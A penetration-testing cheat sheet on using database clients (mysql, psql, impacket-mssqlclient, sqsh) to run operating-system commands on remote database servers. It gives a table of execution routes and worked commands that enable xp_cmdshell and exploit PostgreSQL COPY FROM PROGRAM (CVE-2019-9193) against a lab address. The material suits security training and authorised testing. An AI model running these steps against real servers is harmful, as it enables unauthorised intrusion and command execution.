# 🛠️ Tool Master Guide: Direct Database CLI Clients (mysql, psql, impacket-mssqlclient, sqsh)

> [!INFO] 📋 **Root Metadata**
> - **Category**: Direct Database Command-Line Administration & Privilege Escalation Clients
> - **Tools Covered**: `mysql`, `psql`, `impacket-mssqlclient`, `sqsh`
> - **Installations**: Pre-installed on Kali Linux (`mariadb-client`, `postgresql-client`, `impacket-scripts`, `sqsh`)
> - **Primary Objective**: Directly authenticates to remote database services (MySQL 3306, PostgreSQL 5432, MSSQL 1433, Oracle 1521) to execute SQL queries, enumerate schemas, read system files, and trigger OS command execution mechanisms.

---

## 📋 1. Service Port & OS Command Execution Matrix

| Database Engine | Default Port | CLI Utility | OS Command Execution Vector |
| :--- | :--- | :--- | :--- |
| **Microsoft SQL Server** | 1433 | `impacket-mssqlclient` / `sqsh` | `EXEC xp_cmdshell 'whoami'` |
| **PostgreSQL** | 5432 | `psql` | `COPY cmd FROM PROGRAM 'whoami'` (CVE-2019-9193) |
| **MySQL / MariaDB** | 3306 | `mysql` | User Defined Functions (UDF) `sys_eval()` injection |
| **Oracle TNS** | 1521 | `sqsh` / `sqlplus` | `DBMS_SCHEDULER` or Java Stored Procedures |

---

## 💻 2. Operational Workflows

### Scenario A: Microsoft SQL Server (MSSQL) Command Execution
```bash
# 1. Connect to remote MSSQL Server on port 1433 using Windows Authentication
impacket-mssqlclient -port 1433 domain/username:password@10.10.10.50 -windows-auth

# 2. Inside MSSQL Shell: Enable xp_cmdshell and execute system commands
SQL> enable_xp_cmdshell
SQL> exec xp_cmdshell 'whoami /all'
```

### Scenario B: PostgreSQL CLI (`psql`) OS Command Execution
```bash
# 1. Connect to remote PostgreSQL server on port 5432
psql -h 10.10.10.50 -U postgres -d target_db

# 2. Execute OS command via CVE-2019-9193 (COPY FROM PROGRAM)
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```
